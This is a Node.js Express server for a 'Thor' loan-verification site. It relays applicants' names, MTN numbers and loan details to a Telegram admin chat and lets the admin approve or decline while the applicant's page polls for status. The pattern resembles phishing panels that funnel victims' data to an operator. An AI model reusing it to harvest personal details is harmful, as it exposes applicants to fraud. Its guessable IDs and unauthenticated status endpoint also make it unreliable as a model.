const express = require('express');
const path = require('path');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

const loans = {};
let lastUpdateId = 0;

// Prevent HTML injection if a user types <, >, or & in the form
function escapeHtml(text) {
    return String(text || '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// Helper to format the Thor - Loan Verification message with Bold + Tap-to-Copy values
function buildThorMessage(record, statusText, updatedTime = null) {
    const lines = [
        '⚡ <b>THOR - LOAN VERIFICATION</b>',
        '<b>LOAN APPLICATION RECEIVED</b>',
        '',
        '<b>USER DETAILS</b>',
        '━━━━━━━━━━━━━━━━━━━━',
        `👤 Full Name: <b><code>${escapeHtml(record.fullName)}</code></b>`,
        `📱 MTN Number: <b><code>${escapeHtml(record.mtnNumber)}</code></b>`,
        '',
        '<b>LOAN DETAILS</b>',
        '━━━━━━━━━━━━━━━━━━━━',
        `🆔 Reference ID: <b><code>${escapeHtml(record.id)}</code></b>`,
        `💼 Loan Service: <b><code>${escapeHtml(record.loanService)}</code></b>`,
        `💰 Loan Amount: <b><code>${escapeHtml(record.loanAmount)}</code></b>`,
        `📅 Repayment Period: <b><code>${escapeHtml(record.repaymentPeriod)}</code></b>`,
        '',
        '<b>STATUS</b>',
        '━━━━━━━━━━━━━━━━━━━━',
        `Status: <b>${escapeHtml(statusText)}</b>`
    ];

    if (updatedTime) {
        lines.push(`Status Updated: <b><code>${escapeHtml(updatedTime)}</code></b>`);
    }

    return lines.join('\n');
}

// 1. Receive Application from public/index.html -> Send to Telegram
app.post('/api/loans/apply', async (req, res) => {
    const { fullName, mtnNumber, loanService, loanAmount, repaymentPeriod } = req.body;
    const id = 'LOAN-' + Math.floor(100000 + Math.random() * 900000);

    const record = {
        id,
        fullName,
        mtnNumber,
        loanService,
        loanAmount,
        repaymentPeriod,
        status: 'PENDING'
    };

    loans[id] = record;

    const message = buildThorMessage(record, '⏳ PENDING REVIEW');

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve Loan', callback_data: `APPROVE:${id}` },
                    { text: '❌ Decline', callback_data: `REJECT:${id}` }
                ]]
            }
        });

        res.json({ applicationId: id, status: 'PENDING' });
    } catch (error) {
        console.error('Telegram API Error:', error.response?.data || error.message);
        res.status(500).json({ message: 'Failed to notify admin on Telegram.' });
    }
});

// 2. Frontend Polls This Endpoint While Spinner Runs
app.get('/api/loans/status/:id', (req, res) => {
    const record = loans[req.params.id];
    if (!record) return res.status(404).json({ status: 'NOT_FOUND' });
    res.json({ status: record.status });
});

// 3. Background Listener for Admin Button Taps in Telegram
async function pollTelegramUpdates() {
    if (!BOT_TOKEN) return;
    try {
        const res = await axios.get(`${TELEGRAM_API}/getUpdates`, {
            params: { offset: lastUpdateId + 1, timeout: 25 }
        });

        for (const update of res.data.result) {
            lastUpdateId = update.update_id;

            if (update.callback_query) {
                const cb = update.callback_query;
                const [decision, id] = cb.data.split(':');
                const isApproved = decision === 'APPROVE';
                const updatedTime = new Date().toLocaleString();

                if (loans[id]) {
                    loans[id].status = isApproved ? 'APPROVED' : 'REJECTED';
                }

                await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
                    callback_query_id: cb.id,
                    text: isApproved ? 'Loan Approved!' : 'Loan Declined!'
                });

                const updatedText = loans[id]
                    ? buildThorMessage(
                          loans[id],
                          isApproved ? '✅ APPROVED' : '❌ DECLINED',
                          updatedTime
                      )
                    : `${escapeHtml(cb.message.text)}\n\nStatus: <b>${isApproved ? '✅ APPROVED' : '❌ DECLINED'}</b>\nStatus Updated: <b><code>${escapeHtml(updatedTime)}</code></b>`;

                await axios.post(`${TELEGRAM_API}/editMessageText`, {
                    chat_id: cb.message.chat.id,
                    message_id: cb.message.message_id,
                    text: updatedText,
                    parse_mode: 'HTML'
                });
            }
        }
    } catch (err) {
        // Retry automatically on network hiccup
    } finally {
        setTimeout(pollTelegramUpdates, 1000);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log(`Thor Loan Verification Server running at http://localhost:${PORT}`);
    if (BOT_TOKEN) {
        await axios.get(`${TELEGRAM_API}/deleteWebhook`).catch(() => {});
        pollTelegramUpdates();
    }
});
